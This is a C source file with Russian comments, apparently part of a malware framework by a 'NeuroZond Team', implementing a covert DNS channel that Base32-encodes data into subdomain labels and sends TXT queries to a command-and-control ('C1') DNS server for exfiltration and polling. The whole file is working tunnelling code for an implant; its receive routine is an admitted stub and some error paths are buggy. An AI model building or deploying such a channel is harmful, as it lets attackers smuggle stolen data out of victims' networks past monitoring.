/**
 * @file dns_channel.c
 * @brief Реализация скрытого канала передачи данных через DNS-запросы
 * 
 * Данный модуль предоставляет функции для скрытой передачи данных через DNS-запросы.
 * Основные техники:
 * - Кодирование данных в поддоменах (data.example.com)
 * - Использование различных типов запросов (A, TXT, MX)
 * - Разбиение данных на части для обхода ограничений
 * 
 * @author NeuroZond Team
 * @date 2025-04-28
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include "covert_channel.h"
#include "../crypto/crypto_utils.h"

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

// Константы для DNS-протокола
#define DNS_PORT 53
#define DNS_MAX_PACKET_SIZE 512
#define DNS_HEADER_SIZE 12
#define DNS_MAX_DOMAIN_LENGTH 253
#define DNS_MAX_LABEL_LENGTH 63

// Структуры для работы с DNS
typedef struct {
    unsigned short id;      // Идентификатор запроса
    unsigned short flags;   // Флаги
    unsigned short qdcount; // Количество вопросов
    unsigned short ancount; // Количество ответов
    unsigned short nscount; // Количество записей NS
    unsigned short arcount; // Количество дополнительных записей
} dns_header;

// Типы DNS-запросов
typedef enum {
    DNS_TYPE_A = 1,     // IPv4 адрес
    DNS_TYPE_NS = 2,    // Authoritative name server
    DNS_TYPE_CNAME = 5, // Canonical name for an alias
    DNS_TYPE_SOA = 6,   // Start of a zone of authority
    DNS_TYPE_MX = 15,   // Mail exchange
    DNS_TYPE_TXT = 16   // Text strings
} dns_type;

// Информация о DNS-канале
typedef struct {
    char* c1_dns_server;        // Адрес DNS-сервера C1 (из config->c1_address)
    unsigned short sequence;    // Номер последовательности для сообщений
    int socket;                 // Сокет для DNS-запросов
    char* domain_suffix;        // Суффикс домена (из config->endpoint)
    unsigned char session_id[8]; // Идентификатор сессии
    struct sockaddr_in server;  // Информация о сервере
    bool connected;             // Статус соединения
} dns_channel_data;

// Функции для создания DNS-запросов
static void dns_encode_name(const char* domain, unsigned char* buffer, int* offset);
static void dns_create_query(unsigned char* buffer, int* length, const char* domain, dns_type type);
static int dns_send_query(dns_channel_data* channel, const unsigned char* query, int query_length, unsigned char* response, int response_size);

// Инициализация DNS-канала
static void* dns_channel_init_internal(const covert_channel_config* config) {
    if (!config || !config->c1_address) return false;
    
    // Выделяем память для данных канала
    dns_channel_data* data = (dns_channel_data*)malloc(sizeof(dns_channel_data));
    if (!data) return false;
    
    memset(data, 0, sizeof(dns_channel_data)); // Инициализируем нулями
    
    // Инициализируем параметры канала
    data->c1_dns_server = strdup(config->c1_address);
    data->sequence = 0;
    data->socket = -1;
    data->domain_suffix = strdup(config->endpoint ? config->endpoint : ".c1.local"); // Берем из endpoint или по умолчанию
    data->connected = false;
    
    // Генерируем случайный идентификатор сессии
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 8; i++) {
        data->session_id[i] = rand() % 256;
    }
    
#ifdef _WIN32
    // Инициализация Winsock на Windows
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        free(data->c1_dns_server);
        free(data->domain_suffix);
        free(data);
        return false;
    }
#endif
    
    // Инициализируем сокет
    data->socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (data->socket < 0) {
        free(data->c1_dns_server);
        free(data->domain_suffix);
        free(data);
#ifdef _WIN32
        WSACleanup();
#else
        close(data->socket);
#endif
        return false;
    }
    
    // Настраиваем адрес сервера
    memset(&data->server, 0, sizeof(data->server));
    data->server.sin_family = AF_INET;
    data->server.sin_port = htons(DNS_PORT);
    
    // Пытаемся преобразовать адрес в числовой формат
    if (inet_pton(AF_INET, data->c1_dns_server, &data->server.sin_addr) <= 0) {
        // Если не удалось, пробуем резолвить доменное имя
        struct hostent* he = gethostbyname(data->c1_dns_server);
        if (!he) {
            free(data->c1_dns_server);
            free(data->domain_suffix);
#ifdef _WIN32
            closesocket(data->socket);
            WSACleanup();
#else
            close(data->socket);
#endif
            free(data);
            return false;
        }
        memcpy(&data->server.sin_addr, he->h_addr, he->h_length);
    }
    
    return data;
}

// Установка соединения по DNS каналу
static bool dns_channel_connect_internal(void* channel_data) {
    if (!channel_data) return false;
    
    dns_channel_data* data = (dns_channel_data*)channel_data;
    
    // Формируем запрос для проверки соединения
    // Включаем в запрос идентификатор сессии, чтобы C1 мог нас идентифицировать
    size_t encoded_len = 0;
    // Вычисляем максимальный размер Base32 строки (примерно len * 8/5)
    size_t max_encoded_len = (8 * 8 / 5) + 1; // 8 байт сессии -> ~13 символов Base32 + запас + null
    char* session_encoded = (char*)malloc(max_encoded_len);
    if (!session_encoded) return false;

    if (crypto_base32_encode(data->session_id, 8, session_encoded, &max_encoded_len) != 0) {
        free(session_encoded);
        // Нужна очистка data перед возвратом false
        dns_channel_cleanup_internal(data);
        return false;
    }
    encoded_len = max_encoded_len; // crypto_base32_encode возвращает реальную длину
    
    // Формируем DNS-запрос вида connect-[session_id].c1.local
    char domain[DNS_MAX_DOMAIN_LENGTH];
    snprintf(domain, sizeof(domain), "connect-%s%s", session_encoded, data->domain_suffix);
    free(session_encoded);
    
    // Создаем DNS-запрос
    unsigned char query[DNS_MAX_PACKET_SIZE];
    unsigned char response[DNS_MAX_PACKET_SIZE];
    int query_length = 0;
    
    dns_create_query(query, &query_length, domain, DNS_TYPE_TXT);
    
    // Отправляем запрос и получаем ответ
    int response_len = dns_send_query(data, query, query_length, response, sizeof(response));
    
    // Анализируем ответ (упрощенно для примера)
    // В реальной реализации нужно правильно парсить DNS-пакет
    bool success = (response_len > 0);
    
    if (success) {
        data->connected = true;
    }
    
    return success;
}

// Отправка данных через DNS-канал
static size_t dns_channel_send_internal(void* channel_data, const unsigned char* data, size_t len) {
    if (!channel_data || !data || len == 0) return 0;
    
    dns_channel_data* channel = (dns_channel_data*)channel_data;
    
    // Максимальное количество данных, которое можно отправить в одном поддомене
    const size_t max_chunk_size = 31; // Ограничение для поддомена (не превышает 63 символа после base32)
    
    size_t total_sent = 0;
    size_t remaining = len;
    
    // Разбиваем данные на части
    while (remaining > 0) {
        size_t chunk_size = (remaining > max_chunk_size) ? max_chunk_size : remaining;
        
        // Формируем 3-байтовый заголовок чанка: sequence (2 байта) + chunk_flags (1 байт)
        unsigned char chunk_header[3];
        chunk_header[0] = (channel->sequence >> 8) & 0xFF;
        chunk_header[1] = channel->sequence & 0xFF;
        
        // Флаги чанка: 
        // - 7-й бит: последний чанк (1) или нет (0)
        // - 6-5 биты: зарезервированы
        // - 4-0 биты: размер чанка
        chunk_header[2] = chunk_size & 0x1F;
        if (remaining == chunk_size) {
            chunk_header[2] |= 0x80; // Устанавливаем флаг последнего чанка
        }
        
        // Создаем буфер для данных чанка с учетом заголовка
        unsigned char* chunk_data = (unsigned char*)malloc(3 + chunk_size);
        if (!chunk_data) break;
        
        // Копируем заголовок и данные
        memcpy(chunk_data, chunk_header, 3);
        memcpy(chunk_data + 3, data + total_sent, chunk_size);
        
        // Кодируем данные чанка в поддомен Base32
        size_t data_to_encode_len = 3 + chunk_size;
        size_t max_encoded_len = (data_to_encode_len * 8 / 5) + 2; // Приблизительный макс. размер + запас
        char* encoded_chunk = (char*)malloc(max_encoded_len);
        if (!encoded_chunk) {
        free(chunk_data);
            break;
        }

        size_t encoded_len = max_encoded_len;
        if (crypto_base32_encode(chunk_data, data_to_encode_len, encoded_chunk, &encoded_len) != 0) {
            free(encoded_chunk);
            free(chunk_data);
            break;
        }
        
        // Формируем DNS-запрос вида data-[encoded_chunk].c1.local
        char domain[DNS_MAX_DOMAIN_LENGTH];
        snprintf(domain, sizeof(domain), "data-%s%s", encoded_chunk, channel->domain_suffix);
        free(encoded_chunk);
        
        // Создаем и отправляем DNS-запрос
        unsigned char query[DNS_MAX_PACKET_SIZE];
        unsigned char response[DNS_MAX_PACKET_SIZE];
        int query_length = 0;
        
        dns_create_query(query, &query_length, domain, DNS_TYPE_TXT);
        int response_len = dns_send_query(channel, query, query_length, response, sizeof(response));
        
        // Проверяем успешность отправки
        if (response_len <= 0) break;
        
        // Обновляем счетчики
        total_sent += chunk_size;
        remaining -= chunk_size;
        channel->sequence++;
    }
    
    return total_sent;
}

// Получение данных через DNS-канал
static size_t dns_channel_receive_internal(void* channel_data, unsigned char* buffer, size_t buffer_size) {
    if (!channel_data || !buffer || buffer_size == 0) return 0;
    
    dns_channel_data* channel = (dns_channel_data*)channel_data;
    
    // Формируем запрос на получение данных
    char domain[DNS_MAX_DOMAIN_LENGTH];
    snprintf(domain, sizeof(domain), "poll-%04x%s", channel->sequence, channel->domain_suffix);
    
    // Создаем DNS-запрос
    unsigned char query[DNS_MAX_PACKET_SIZE];
    unsigned char response[DNS_MAX_PACKET_SIZE];
    int query_length = 0;
    
    dns_create_query(query, &query_length, domain, DNS_TYPE_TXT);
    
    // Отправляем запрос и получаем ответ
    int response_len = dns_send_query(channel, query, query_length, response, sizeof(response));
    
    // Если ответ получен, парсим его
    if (response_len > 0) {
        // В реальной реализации здесь должен быть код для извлечения TXT-записи из ответа
        // и декодирования содержимого ответа
        
        // --- КРИТИЧЕСКАЯ ЗАГЛУШКА --- 
        // TODO: Реализовать парсинг DNS ответа (TXT запись) и Base32 декодирование
        fprintf(stderr, "[!] WARNING: dns_channel_receive is a STUB and does not parse real data!\n");

        // Пока возвращаем 0, так как реальных данных нет
        return 0;
    }
    
    return 0;
}

// Проверка состояния соединения
static bool dns_channel_is_connected_internal(void* channel_data) {
    dns_channel_data* data = (dns_channel_data*)channel_data;
    // TODO: Добавить реальную проверку связи (например, отправить connect-запрос и ждать ответ)?
    // Пока просто возвращаем сохраненный статус.
    return (data && data->connected);
}

// Освобождение ресурсов DNS-канала
static void dns_channel_cleanup_internal(void* channel_data) {
    if (!channel_data) return;
    
    dns_channel_data* data = (dns_channel_data*)channel_data;
    
    if (data->socket >= 0) {
#ifdef _WIN32
        closesocket(data->socket);
        WSACleanup();
#else
        close(data->socket);
#endif
    }
    
    if (data->c1_dns_server) {
        free(data->c1_dns_server);
    }
    
    if (data->domain_suffix) {
        free(data->domain_suffix);
    }
    
    free(data);
}

// Создание DNS-запроса
static void dns_create_query(unsigned char* buffer, int* length, const char* domain, dns_type type) {
    if (!buffer || !length || !domain) return;
    
    // Заполняем заголовок DNS
    dns_header* header = (dns_header*)buffer;
    memset(header, 0, sizeof(dns_header));
    
    // Генерируем случайный ID
    header->id = (unsigned short)(rand() & 0xFFFF);
    header->flags = htons(0x0100); // Стандартный запрос
    header->qdcount = htons(1);    // 1 вопрос
    
    // Смещение после заголовка
    int offset = sizeof(dns_header);
    
    // Кодируем доменное имя
    dns_encode_name(domain, buffer, &offset);
    
    // Добавляем тип и класс запроса
    buffer[offset++] = 0x00;
    buffer[offset++] = (unsigned char)type;
    buffer[offset++] = 0x00;
    buffer[offset++] = 0x01; // Класс IN
    
    *length = offset;
}

// Кодирование доменного имени в DNS-формат
static void dns_encode_name(const char* domain, unsigned char* buffer, int* offset) {
    if (!domain || !buffer || !offset) return;
    
    int dot_pos, len;
    int i = 0;
    int pos = *offset;
    
    while (domain[i]) {
        // Находим позицию следующей точки
        for (dot_pos = i; domain[dot_pos] && domain[dot_pos] != '.'; dot_pos++);
        
        // Вычисляем длину метки
        len = dot_pos - i;
        if (len > 0 && len <= DNS_MAX_LABEL_LENGTH) {
            buffer[pos++] = (unsigned char)len;
            // Копируем метку
            memcpy(buffer + pos, domain + i, len);
            pos += len;
        }
        
        if (domain[dot_pos] == '.') {
            i = dot_pos + 1;
        } else {
            break;
        }
    }
    
    // Завершаем доменное имя нулевым байтом
    buffer[pos++] = 0;
    
    *offset = pos;
}

// Отправка DNS-запроса и получение ответа
static int dns_send_query(dns_channel_data* channel, const unsigned char* query, int query_length, unsigned char* response, int response_size) {
    if (!channel || !query || query_length <= 0 || !response || response_size <= 0) return -1;
    
    // Структура для таймаута
#ifdef _WIN32
    DWORD timeout = 5000; // 5 секунд
    setsockopt(channel->socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(channel->socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
#endif
    
    // Отправляем запрос
    if (sendto(channel->socket, (const char*)query, query_length, 0, 
              (struct sockaddr*)&channel->server, sizeof(channel->server)) < 0) {
        return -1;
    }
    
    // Получаем ответ
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    
    int received = recvfrom(channel->socket, (char*)response, response_size, 0, 
                          (struct sockaddr*)&from, &from_len);
    
    return received;
}

// --- Регистрация обработчиков для covert_channel --- 

void register_dns_channel_handler(CovertChannelHandler *handler) {
    if (!handler) {
        return;
    }
    
    handler->init = dns_channel_init_internal;
    handler->connect = dns_channel_connect_internal;
    handler->send = dns_channel_send_internal;
    handler->receive = dns_channel_receive_internal;
    handler->cleanup = dns_channel_cleanup_internal;
    // set_jitter не нужен, управляется централизованно
    handler->is_connected = dns_channel_is_connected_internal;
} 